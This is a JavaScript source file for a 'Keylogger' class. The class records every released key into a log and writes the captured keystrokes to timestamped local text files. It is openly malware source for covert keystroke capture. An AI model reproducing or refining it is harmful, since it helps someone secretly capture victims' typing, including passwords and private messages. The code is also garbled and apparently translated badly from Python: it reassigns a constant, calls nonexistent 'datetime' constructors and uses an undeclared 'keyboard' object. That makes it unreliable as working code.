class Keylogger {
    constructor(interval) {
        this.interval = interval;
        this.log = '';
        this.start_dt = new datetime.utcnow();
        this.end_dt = new datetime.utcnow();
    }

    callback(event) {
        const name = event.name;
        if (name.length > 1) {
            if (name ==='space') {
                name ='';
            }

            if (name === 'enter') {
                name = '\n';
            }

            if (name === 'decimal') {
                name = '.';
            }

            name = name.replace(/\s/g, '_').toUpperCase();

        }
        this.log += name;
    }

    update_filename() {
        const start_dt_str = this.start_dt.toISOString().slice(0, -7).replace(/[:\s]/g, '');
        const end_dt_str = this.end_dt.toISOString().slice(0, -7).replace(/[:\s]/g, '');
        this.filename = `keylog-${start_dt_str}-${end_dt_str}`;
    }

    report_to_file() {
        const log = this.log;
        if (log) {
            this.end_dt = new datetime.utcnow();
            this.update_filename();
            this.log_to_file();
            this.start_dt = new datetime.utcnow();
        }
    }

    log_to_file() {
        const file = `keylog-${this.filename}.txt`;
        const fs = require('fs');
        const fd = fs.createWriteStream(file);
        fd.write(this.log);
        fd.end();
    }

    start() {
        keyboard.onRelease(event => {
            this.callback(event);
        });

        keyboard.wait();
    }

    stop() {
        keyboard.off();
    }

    report() {
        if (this.log) {
            this.end_dt = new datetime.utcnow();
            this.update_filename();
            this.report_to_file();
            this.start_dt = new datetime.utcnow();
        }
    }
}

